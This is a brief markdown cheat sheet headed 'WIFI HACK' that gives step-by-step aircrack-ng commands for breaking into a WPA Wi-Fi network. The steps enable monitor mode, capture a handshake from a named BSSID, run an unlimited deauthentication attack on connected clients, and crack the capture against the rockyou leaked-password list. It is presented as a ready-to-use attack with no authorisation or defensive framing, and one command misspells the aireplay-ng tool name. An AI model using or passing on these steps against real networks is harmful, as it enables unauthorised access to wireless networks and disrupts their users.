# _*WIFI HACK*_

`! See interfaces`

    ifconfig
  
 `!kill processes`
 
    sudo airmon-ng check kill
  
`!Start monitor mode`

    sudo airmon-ng start wlp2s0
  
`!Verify that monitor mode is used`
 
    sudo airmon-ng
    
`! Get the AP's MAC address && BSSID and channel`

    sudo airodump-ng wlp2s0mon
    
 `!1st Window:
!Make sure you replace the channel number and bssid with your own
!Replace handshake with your file name like capture1 or something `

    sudo airodump-ng -w /home/astute/temp/handshake -c 1 --bssid B8:C1:A2:2E:39:14 wlp2s0mon
  
`!2nd Window - deauth attack
!Make sure you replace the bssid with your own`

    sudo aireplay --deauth 0 -a B8:C1:A2:2E:39:14 wlp2s0mon
    
 `crack the handshake.cap`
 
    sudo aircrack-ng handshake.cap -w /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt

`don't forget to stop monitor mode`

    sudo airmon-ng stop wlp2s0mon
    
